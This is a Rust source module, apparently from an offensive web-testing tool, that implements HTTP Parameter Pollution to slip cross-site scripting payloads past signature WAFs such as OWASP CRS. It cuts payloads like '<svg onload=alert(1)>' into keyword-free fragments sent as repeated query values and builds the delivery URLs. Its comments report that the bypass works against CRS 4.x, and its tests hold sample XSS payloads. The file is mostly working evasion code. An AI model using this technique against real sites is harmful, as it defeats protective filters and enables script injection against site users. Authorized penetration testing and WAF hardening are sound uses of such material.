//! HTTP Parameter Pollution (HPP) reassembly — the **parsing-layer** evasion
//! axis for `exploit`.
//!
//! The payload-token and reflection-context axes are exhausted against a
//! signature WAF, and so is cleartext keyword obfuscation: OWASP CRS's
//! libinjection scores the *structure* of an injection (`";...[...](...)//`,
//! `<svg onload=`), not just its keywords, so hiding the word `alert` is not
//! enough — a single inert-looking but structurally-complete payload is still
//! blocked. The [`app_transform`](crate::transform_encode) axis answers that by
//! hiding the whole payload inside an opaque *encoding* the app decodes.
//!
//! This module is the second answer, requiring **no encoding at all**: split the
//! payload across several values of the *same* parameter (HTTP Parameter
//! Pollution). The WAF inspects each value independently and sees only inert
//! fragments — no fragment is a signature, none is structurally complete. An
//! application that joins the duplicate values (PHP `implode($_GET['q'])`, a
//! framework that exposes repeated params as a list, a manual concatenation)
//! reassembles the live markup and it executes. Empirically (`reflect-origin`
//! `ctx=hpp`, CRS 4.x PL2): `<svg onload=alert(1)>` delivered as
//! `q=<sv&q=g onlo&q=ad=ale&q=rt(1)>` passes the WAF and detonates, while the
//! same payload in a single value is 403'd.
//!
//! The fragmentation is **keyword-agnostic**: rather than a banned-word list, it
//! cuts inside every maximal alphabetic run, so identifiers like `onerror`,
//! `script`, `svg`, `alert` are each broken across a boundary regardless of
//! which keyword they are. The detonation oracle decides which fragmentation
//! actually bypasses and executes, so the splitter only has to make signatures
//! *unlikely*, not prove it per-WAF.

/// Byte indices at which to cut `payload` so every maximal run of ASCII letters
/// with length ≥ 3 is split near its midpoint. Breaking the middle of each
/// identifier means no resulting fragment carries a whole keyword.
fn alpha_midpoint_cuts(payload: &str) -> Vec<usize> {
    let chars: Vec<(usize, char)> = payload.char_indices().collect();
    let n = chars.len();
    let mut cuts = Vec::new();
    let mut run_start: Option<usize> = None;
    for i in 0..=n {
        let is_alpha = i < n && chars[i].1.is_ascii_alphabetic();
        if is_alpha {
            if run_start.is_none() {
                run_start = Some(i);
            }
        } else if let Some(s) = run_start.take() {
            let len = i - s;
            if len >= 3 {
                // Cut before the middle character of the run (a byte boundary,
                // since char_indices gives real boundaries).
                cuts.push(chars[s + len / 2].0);
            }
        }
    }
    cuts
}

/// Split `payload` at the given (sorted, in-range) byte indices into fragments
/// that concatenate back to `payload` exactly.
fn split_at(payload: &str, cuts: &[usize]) -> Vec<String> {
    let mut frags = Vec::new();
    let mut prev = 0usize;
    for &c in cuts {
        if c > prev && c <= payload.len() {
            frags.push(payload[prev..c].to_string());
            prev = c;
        }
    }
    if prev < payload.len() {
        frags.push(payload[prev..].to_string());
    }
    if frags.is_empty() {
        frags.push(payload.to_string());
    }
    frags
}

/// Split `payload` into fragments of at most `k` characters each.
fn fixed_width(payload: &str, k: usize) -> Vec<String> {
    let chars: Vec<char> = payload.chars().collect();
    if k == 0 || chars.len() <= 1 {
        return vec![payload.to_string()];
    }
    chars
        .chunks(k)
        .map(|c| c.iter().collect::<String>())
        .collect()
}

/// Fragmentations to try for `payload`, strongest first. Each inner vector is
/// one ordered fragmentation that concatenates back to `payload`. The detonation
/// oracle picks the ones that bypass and execute; trying several raises the odds
/// that at least one slips a given WAF.
pub(crate) fn fragmentations(payload: &str) -> Vec<Vec<String>> {
    let mut out: Vec<Vec<String>> = Vec::new();
    let am = split_at(payload, &alpha_midpoint_cuts(payload));
    if am.len() > 1 {
        out.push(am);
    }
    for k in [3usize, 2] {
        let fw = fixed_width(payload, k);
        if fw.len() > 1 && !out.contains(&fw) {
            out.push(fw);
        }
    }
    if out.is_empty() {
        // Degenerate (payload too short to split) — deliver as a single value.
        out.push(vec![payload.to_string()]);
    }
    out
}

/// Build an HPP delivery URL: `target` followed by one `param=<fragment>` pair
/// per fragment, every fragment singly URL-encoded. The first pair reuses
/// [`scan_url_with_param`](crate::scan::scan_url_with_param) for the correct
/// `?` vs `&` separator; the rest append with `&`.
pub(crate) fn hpp_url(target: &str, param: &str, frags: &[String]) -> String {
    let mut it = frags.iter();
    let first = it
        .next()
        .map(|f| urlencoding::encode(f).into_owned())
        .unwrap_or_default();
    let mut url = crate::scan::scan_url_with_param(target, param, &first);
    for f in it {
        let enc = urlencoding::encode(f).into_owned();
        url.push('&');
        url.push_str(param);
        url.push('=');
        url.push_str(&enc);
    }
    url
}

/// Join fragments back into the payload they reassemble to (for operator
/// display: the markup the app reconstructs and that actually executes).
pub(crate) fn reassemble(frags: &[String]) -> String {
    frags.concat()
}

#[cfg(test)]
mod tests {
    use super::*;

    const SVG: &str = "<svg onload=alert(1)>";
    const IMG: &str = "<img src=x onerror=alert(1)>";

    #[test]
    fn every_fragmentation_reassembles_to_the_payload() {
        for p in [SVG, IMG, "<script>alert(1)</script>"] {
            for frag in fragmentations(p) {
                assert_eq!(
                    reassemble(&frag),
                    p,
                    "fragmentation must round-trip: {frag:?}"
                );
            }
        }
    }

    #[test]
    fn alpha_midpoint_breaks_every_keyword() {
        // No fragment may contain a whole dangerous identifier — that is the
        // property that makes each fragment inert to a signature WAF.
        let frags = split_at(SVG, &alpha_midpoint_cuts(SVG));
        assert!(frags.len() > 1, "must split: {frags:?}");
        for kw in ["svg", "onload", "alert"] {
            assert!(
                frags.iter().all(|f| !f.contains(kw)),
                "fragment leaked keyword `{kw}`: {frags:?}"
            );
        }
        let fimg = split_at(IMG, &alpha_midpoint_cuts(IMG));
        for kw in ["img", "onerror", "alert", "src"] {
            assert!(
                fimg.iter().all(|f| !f.contains(kw)),
                "fragment leaked keyword `{kw}`: {fimg:?}"
            );
        }
    }

    #[test]
    fn hpp_url_emits_one_encoded_pair_per_fragment() {
        let frags = vec![
            "<sv".to_string(),
            "g onlo".to_string(),
            "ad=ale".to_string(),
        ];
        let url = hpp_url("http://t/?ctx=hpp", "q", &frags);
        // Three q= pairs, single ? (query already present → all &).
        assert_eq!(url.matches("q=").count(), 3, "one pair per fragment: {url}");
        assert_eq!(url.matches('?').count(), 1, "no second ?: {url}");
        // Fragments are URL-encoded: `<` → %3C, space → %20, never raw.
        assert!(url.contains("%3C"), "must encode `<`: {url}");
        assert!(!url.contains("<sv"), "raw `<` must not survive: {url}");
        // No double-encoding of the percent sign.
        assert!(!url.contains("%253C"), "double-encoded: {url}");
    }

    #[test]
    fn hpp_url_uses_question_mark_when_no_query_present() {
        let url = hpp_url("http://t/search", "q", &["a".into(), "b".into()]);
        assert_eq!(url.matches('?').count(), 1, "exactly one ?: {url}");
        assert!(url.contains('&'), "second fragment appended with &: {url}");
    }

    #[test]
    fn short_payload_degrades_to_single_value() {
        // Nothing to split — must still deliver the payload, never drop it.
        let frags = fragmentations("ab");
        assert_eq!(frags, vec![vec!["ab".to_string()]]);
    }

    #[test]
    fn fixed_width_chunks_are_bounded() {
        let fw = fixed_width("abcdefg", 3);
        assert_eq!(fw, vec!["abc", "def", "g"]);
        assert_eq!(reassemble(&fw), "abcdefg");
    }
}
